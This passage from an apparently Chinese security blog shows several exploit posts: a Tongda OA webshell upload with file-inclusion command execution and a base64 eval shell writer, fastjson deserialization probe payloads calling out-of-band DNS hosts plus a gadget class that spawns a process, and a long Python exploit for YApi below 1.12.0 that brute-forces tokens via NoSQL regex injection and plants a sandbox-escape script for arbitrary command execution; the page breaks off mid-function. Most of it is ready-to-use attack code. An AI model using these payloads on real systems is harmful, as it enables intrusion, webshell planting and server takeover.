deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3--</span><br></pre></td></tr></table></figure>
<p>这里使用了COM组件wscript.shell来绕过disable_function</p>
<p>接下来访问文件包含利用的链接：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php，</p>
<p>POST给json赋值，指定key为url，value为文件位置</p>
<p>修改为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 10.103.51.104</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2009/1066533428.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
<p>成功执行命令！也可以把图片马的内容改为执行写入一句话的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fopen(&#x27;test.php&#x27;, &#x27;w&#x27;);</span><br><span class="line">$a = base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;);</span><br><span class="line">fwrite($fp, $a);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
<p>修改文件名发包执行文件包含后，shell被成功写入：</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/fastjson-POC/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/fastjson-POC/" class="post-title-link" itemprop="url">fastjson POC</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:52:14 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T09:52:14+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;test.k3s04c.ceye.io&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;test.t1y0hvyndf58.padns.icu&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java.net.InetAddress</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package com.example.a;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">class Calc &#123;</span><br><span class="line">    public String age ;</span><br><span class="line"></span><br><span class="line">    public String getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(String age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;calc&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public Calc() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public void print()&#123;</span><br><span class="line">        System.out.println(&quot;test&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.example.a;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Hello world!</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">public class App </span><br><span class="line">&#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        String js = &quot;&#123;\&quot;@type\&quot;:\&quot;com.example.a.Calc\&quot;,\&quot;age\&quot;:80&#125;&quot;;</span><br><span class="line">        JSON.parse(js);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/yapi-1-12-0%E6%BC%8F%E6%B4%9EEXP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/yapi-1-12-0%E6%BC%8F%E6%B4%9EEXP/" class="post-title-link" itemprop="url">yapi < 1.12.0漏洞EXP</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 09:50:40 / 修改时间：09:51:00" itemprop="dateCreated datePublished" datetime="2024-09-10T09:50:40+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="0x1-使用"><a href="#0x1-使用" class="headerlink" title="0x1 使用"></a>0x1 使用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python yapi.py --debug one4all -u https://yapi.test.tv/</span><br></pre></td></tr></table></figure>

<h1 id="0x2-EXP"><a href="#0x2-EXP" class="headerlink" title="0x2 EXP"></a>0x2 EXP</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import click</span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import logging</span><br><span class="line">import hashlib</span><br><span class="line">import binascii</span><br><span class="line">from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes</span><br><span class="line">from cryptography.hazmat.primitives import padding</span><br><span class="line">from urllib.parse import urljoin</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(&#x27;attacker&#x27;)</span><br><span class="line">logger.setLevel(&#x27;WARNING&#x27;)</span><br><span class="line">ch = logging.StreamHandler(sys.stdout)</span><br><span class="line">ch.setFormatter(logging.Formatter(&#x27;%(asctime)s - %(message)s&#x27;))</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line">choices = &#x27;abcedf0123456789&#x27;</span><br><span class="line">script_template = r&#x27;&#x27;&#x27;const sandbox = this</span><br><span class="line">const ObjectConstructor = this.constructor</span><br><span class="line">const FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line">const myfun = FunctionConstructor(&#x27;return process&#x27;)</span><br><span class="line">const process = myfun()</span><br><span class="line">const Buffer = FunctionConstructor(&#x27;return Buffer&#x27;)()</span><br><span class="line">const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#x27;%s&#x27;, &#x27;hex&#x27;).toString()).toString()</span><br><span class="line">context.responseData = &#x27;testtest&#x27; + output + &#x27;testtest&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def compute(passphase: str):</span><br><span class="line">    nkey = 24</span><br><span class="line">    niv = 16</span><br><span class="line">    key = &#x27;&#x27;</span><br><span class="line">    iv = &#x27;&#x27;</span><br><span class="line">    p = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        h.update(binascii.unhexlify(p))</span><br><span class="line">        h.update(passphase.encode())</span><br><span class="line">        p = h.hexdigest()</span><br><span class="line"></span><br><span class="line">        i = 0</span><br><span class="line">        n = min(len(p) - i, 2 * nkey)</span><br><span class="line">        nkey -= n // 2</span><br><span class="line">        key += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line">        n = min(len(p) - i, 2 * niv)</span><br><span class="line">        niv -= n // 2</span><br><span class="line">        iv += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line"></span><br><span class="line">        if nkey + niv == 0:</span><br><span class="line">            return binascii.unhexlify(key), binascii.unhexlify(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def aes_encode(data):</span><br><span class="line">    key, iv = compute(&#x27;abcde&#x27;)</span><br><span class="line">    padder = padding.PKCS7(128).padder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()</span><br><span class="line">    return binascii.hexlify(ct).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def aes_decode(data):</span><br><span class="line">    key, iv = compute(&#x27;abcde&#x27;)</span><br><span class="line">    unpadder = padding.PKCS7(128).unpadder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    ct = decryptor.update(binascii.unhexlify(data)) + decryptor.finalize()</span><br><span class="line">    ct = unpadder.update(ct) + unpadder.finalize()</span><br><span class="line">    return ct.decode().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def brute_token(target, already):</span><br><span class="line">    url = urljoin(target, &#x27;/api/interface/up&#x27;)</span><br><span class="line">    current = &#x27;^&#x27;</span><br><span class="line">    for i in range(20):</span><br><span class="line">        for ch in choices:</span><br><span class="line">            guess = current + ch</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: -1,</span><br><span class="line">                &#x27;token&#x27;: &#123;</span><br><span class="line">                    &#x27;$regex&#x27;: guess,</span><br><span class="line">                    &#x27;$nin&#x27;: already</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.post(url,</span><br><span class="line">                                     data=json.dumps(data),</span><br><span class="line">                                     headers=headers,</span><br><span class="line">                                     # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                                     # verify=False,</span><br><span class="line">                                     )</span><br><span class="line">            res = response.json()</span><br><span class="line"></span><br><span class="line">            if res[&#x27;errcode&#x27;] == 400:</span><br><span class="line">                current = guess</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        logger.debug(f&#x27;current cuess: &#123;current&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">    return current[1:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_owner_uid(target, token):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/get&#x27;)</span><br><span class="line">    for i in range(1, 200):</span><br><span class="line">        params = &#123;&#x27;token&#x27;: aes_encode(f&#x27;&#123;i&#125;|&#123;token&#125;&#x27;)&#125;</span><br><span class="line">        response = requests.get(url, params=params,</span><br><span class="line">                            # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            # verify=False,</span><br><span class="line">                            )</span><br><span class="line">        data = response.json()</span><br><span class="line">        if data[&#x27;errcode&#x27;] == 0:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_project(target, token, pid=None):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/get&#x27;)</span><br><span class="line">    params = &#123;&#x27;token&#x27;: token&#125;</span><br><span class="line">    if pid:</span><br><span class="line">        params[&#x27;id&#x27;] = pid</span><br><span class="line"></span><br><span class="line">    response = requests.get(url,</span><br><span class="line">                            params=params,</span><br><span class="line">                            #proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            #verify=False,</span><br><span class="line">                            )</span><br><span class="line">    data = response.json()</span><br><span class="line"></span><br><span class="line">    if data[&#x27;errcode&#x27;] == 0:</span><br><span class="line">        return data[&#x27;data&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def find_col(target, token, brute_from, brute_to):</span><br><span class="line">    url = urljoin(target, &#x27;/api/open/run_auto_test&#x27;)</span><br><span class="line"></span><br><span class="line">    for i in range(brute_from, brute_to):</span><br><span class="line">        try:</span><br><span class="line">            params = &#123;&#x27;token&#x27;: token, &#x27;id&#x27;: i, &quot;mode&quot;: &quot;json&quot;&#125;</span><br><span class="line">            response = requests.get(url,</span><br><span class="line">                                    params=params,</span><br><span class="line">                                    timeout=5,</span><br><span class="line">                                    #proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                                    #verify=False,</span><br><span class="line">                                    )</span><br><span class="line"></span><br><span class="line">            data = response.json()</span><br><span class="line">            if &#x27;message&#x27; not in data:</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if data[&#x27;message&#x27;][&#x27;len&#x27;] &gt; 0:</span><br><span class="line">                logger.debug(&#x27;Test Result Found: %r&#x27;, response.url)</span><br><span class="line">                yield i</span><br><span class="line">        except requests.exceptions.Timeout:</span><br><span class="line">            logger.debug(&#x27;id=%d timeout&#x27;, i)</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_project(target, token, project_id, command):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/up&#x27;)</span><br><span class="line"></span><br><span class="line">    command_hex = command.encode().hex()</span><br><span class="line">    script = script_template % command_hex</span><br><span class="line">    response = requests.post(url,</span><br><span class="line">                             params=&#123;&#x27;token&#x27;: token&#125;,</span><br><span class="line">                             json=&#123;&#x27;id&#x27;: project_id, &#x27;after_script&#x27;: script&#125;,</span><br><span class="line">                             # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                             # verify=False,</span><br><span class="line">                             )</span><br><span class="line">    data = response.json()</span><br><span class="line">    return data[&#x27;errcode&#x27;] == 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_auto_test(target, token, col_id):</span><br><span class="line">    url = urljoin(target, &#x27;/api/open/run_auto_test&#x27;)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, </span><br><span class="line">                            params=&#123;&#x27;token&#x27;: token, &#x27;id&#x27;: col_id, &#x27;mode&#x27;: &#x27;json&#x27;&#125;,</span><br><span class="line">                            # proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span><br><span class="line">                            # verify=False,</span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        data = response.json()</span><br><span class="line">        return data[&#x27;list&#x27;][0][&#x27;res_body&#x27;][8:-8]</span><br><span class="line">    except (requests.exceptions.JSONDecodeError, KeyError, IndexError, TypeError) as e:</span><br><span class="line">        g = re.search(br&#x27;testtest(.*?)testtest&#x27;, response.content, re.I | re.S)</span><br><span class="line">        if g:</span><br><span class="line">            return g.group(1).decode()</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def clear_project(target, token, project_id, old_after_script):</span><br><span class="line">    url = urljoin(target, &#x27;/api/project/up&#x27;)</span><br><span class="line">    response = requests.post(url, params=&#123;&#x27;token&#x27;: token&#125;, json=&#123;&#x27;id&#x27;: project_id, &#x27;after_script&#x27;: 